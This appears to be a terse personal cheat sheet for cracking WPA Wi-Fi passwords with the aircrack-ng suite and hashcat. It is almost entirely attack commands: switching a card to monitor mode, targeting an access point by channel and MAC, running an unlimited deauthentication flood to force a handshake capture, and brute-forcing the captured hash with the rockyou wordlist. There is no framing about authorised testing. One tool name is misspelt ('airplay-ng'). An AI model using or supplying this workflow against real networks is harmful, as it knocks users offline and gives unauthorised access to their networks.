0. need wifi card that support monitor mode

1. get channel and mac of a WAP

2. sniff to a 4 way handshake 

3. deauthentication attack -> reconnecting

4. sniffed hashed password -> crack using aircrack or hashcat




Lets do this:
    put wifi card to monitor mode

    airmon-ng check <wifi interface>

    kill all the processes: $ airmon-ng check kill

    airodump-ng <wifi interface>

    airodump-ng -c <CH> --bssid <MAC> -w filename_test <wifi interface>

    airplay-ng -0 0 -a <MAC> <wifi interface> ==> ctrl C after a few seconds

    -> got 4 files -> .cap file is important

    
    use this to crack a password on kali: $ aircrack-ng -w <rockyou.txt> <.cap file> 

    or use hashcat with GPU:
        hashcat -a 0 -m 2500 <.cap => .hccatx> <rockyou.txt>
